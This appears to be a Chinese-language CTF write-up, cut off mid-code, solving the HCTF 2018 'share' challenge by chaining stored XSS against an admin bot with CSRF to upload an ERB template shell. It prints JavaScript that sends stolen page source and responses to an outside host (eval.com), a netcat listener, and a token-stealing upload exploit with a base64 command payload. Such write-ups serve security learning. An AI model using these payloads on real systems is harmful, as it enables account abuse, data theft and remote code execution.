> **描述**
>
> I have built an app sharing platform, welcome to share your favorite apps
> for everyone
>
> hint1:
>
> Alpha_test code:
>
> hint2:
>  
>  
>     
>  
>
> in root_path
>
> hint3: based ruby 2.5.0
>
> **URL**
>
> [http://share.2018.hctf.io](http://share.2018.hctf.io/)
>
> **基准分数** 1000.00
>
> **当前分数** 965.54
>
> **完成队伍数** 1
* * *
开始做这道题，本来是因为疑似XSS，勾起了自己的兴趣。没想到越往后越坑。ruby真心没见过。最终耗时27小时，终于搞出来了，话说一血还是很开心的。
## 解题
首先分析一波整到题目，按照题目描述，这个网站是用来共享应用的。
首先用户可以向管理员反馈建议，让管理员将某应用加到网站上。
然后管理员页面会有上传应用到网站上，以及将某应用下发给某人进行测试。
主要页面如下：
> 用户：
>
> 应用展示页：
>
> 测试应用页：
>
> 反馈建议页：
通过用户反馈页面，可以尝试插入xss。在这里用img进行测试:
然后在eval.com进行监听。
    nc -lnvp 2222
成功收到回显，可以得知采用PhantomJS作为bot，然后尝试读取后台源码。
    function send(e) {
        var t = new XMLHttpRequest;
        t.open("POST", "//eval.com:2017", !0),
        t.setRequestHeader("Content-type", "text/plain"),
        t.onreadystatechange = function() {
            4 == t.readyState && t.status
        },
        t.send(e);
    }
    function getsource(src){
        var t = new XMLHttpRequest;
        t.open("GET", src, !0),
        t.setRequestHeader("Content-type", "text/plain"),
        t.onreadystatechange = function() {
            4 == t.readyState && t.status
        },
        t.onload=function(e){
            send(e.target.responseText);
        }
        t.send();
    }
    getsource("/home/publiclist");
通过后台源码可以发现管理员页面。
> 管理员：
>
> 上传应用页：
>
> 下发应用页：
至此，可以猜测完整利用链为如下：
> CSRF上传shell --> CSRF将文件下发到用户端 --> 用户端获得shell链接 --> GET Shell
一开始，按正常逻辑，写出upload的exp， 经本地测试完全可用。然而打过去之后，发现一直报错500。尝试下发的时候，也是500。
真心难受，最后实在受不了问出题人，他说他的payload没问题，可以用的。
最后，在自己和题目的磨磨唧唧中，队友发来了robots.txt里有代码。然后…心态有点炸。就顾xss了，竟然忘了渗透的基本要素，逮到网站先扫扫。
拿到upload的源码如下。
    # post /file/upload
      def upload
        if(params[:file][:myfile] != nil && params[:file][:myfile] != "")
          file = params[:file][:myfile]
          name = Base64.decode64(file.original_filename)
          ext = name.split('.')[-1]
          if ext == name || ext ==nil
            ext=""
          end
          share = Tempfile.new(name.split('.'+ext)[0],Rails.root.to_s+"/public/upload")
          share.write(Base64.decode64(file.read))
          share.close
          File.rename(share.path,share.path+"."+ext)
          tmp = Sharefile.new
          tmp.public = 0
          tmp.path = share.path
          tmp.name = name
          tmp.tempname= share.path.split('/')[-1]+"."+ext
          tmp.context = params[:file][:context]
          tmp.save
        end
        redirect_to root_path
      end
可以发现此处上传的文件名和文件内容，都会经过base64解码，所以此时需要修改一下。
最终exp如下：
    function send(e) {
        var t = new XMLHttpRequest;
        t.open("POST", "//eval.com:2017", !0),
        t.setRequestHeader("Content-type", "text/plain"),
        t.onreadystatechange = function() {
            4 == t.readyState && t.status
        },
        t.send(e);
    }
    function submitRequest(authenticity_token)
    {
        authenticity_token = authenticity_token.replace(/\+/g, "%2b");
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "/file/upload", true);
        xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
        xhr.setRequestHeader("Accept-Language", "de-de,de;q=0.8,en-us;q=0.5,en;q=0.3");
        xhr.setRequestHeader("Content-Type", "multipart/form-data; boundary=---------------------------WebKitFormBoundaryunB6T8sJg0SQvlKP");
        xhr.withCredentials = "true";
        var body = "-----------------------------WebKitFormBoundaryunB6T8sJg0SQvlKP\r\n" +
          "Content-Disposition: form-data; name=\"utf8\"\r\n" +
          "\r\n" +
          "%E2%9C%93\r\n"+
          "-----------------------------WebKitFormBoundaryunB6T8sJg0SQvlKP\r\n" +
          "Content-Disposition: form-data; name=\"authenticity_token\"\r\n" +
          "\r\n" +
          authenticity_token + "\r\n" +
          "-----------------------------WebKitFormBoundaryunB6T8sJg0SQvlKP\r\n" +
          "Content-Disposition: form-data; name=\"file[context]\"\r\n" +
          "\r\n" +
          "1\"\r\n" +
          "-----------------------------WebKitFormBoundaryunB6T8sJg0SQvlKP\r\n" +
          "Content-Disposition: form-data; name=\"file[myfile]\"; filename=\"PD9waHAgcGhwaW5mbygpOyA/Pg==\"\r\n" +
          "Content-Type: application/octet-stream\r\n" +
          "\r\n" +
          "PCU9YGNhdCAvZmxhZ2AlPg==\r\n" +
          "-----------------------------WebKitFormBoundaryunB6T8sJg0SQvlKP--\r\n"+
          "Content-Disposition: form-data; name=\"commit\"\r\n" +
          "\r\n" +
          "submit\r\n" +
          "-----------------------------WebKitFormBoundaryunB6T8sJg0SQvlKP\r\n";
        var aBody = new Uint8Array(body.length);
        for (var i = 0; i < aBody.length; i++)
          aBody[i] = body.charCodeAt(i);
        xhr.onload=function(evt){
          var data = evt.target.responseText;
          send(data);
        }
        xhr.send(new Blob([aBody]));
    }
    function gettoken(){
        var t = new XMLHttpRequest;
        t.open("GET", "/home/upload", !0),
        t.setRequestHeader("Content-type", "text/plain"),
        t.onreadystatechange = function() {
            4 == t.readyState && t.status
        },
        t.onload=function(evt){
          var data = evt.target.responseText;
          regex = /<input type="hidden" name="authenticity_token" value="(.+)?"/g;
          submitRequest(regex.exec(data)[1]);
        }
        t.send();
    }
    gettoken();
此时可以成功上传文件，可以在Alphatest页面，查看到当前总文件数。
然后通过CSRF构造下发。
    function send(e) {
        var t = new XMLHttpRequest;
        t.open("POST", "//eval.com:2017", !0),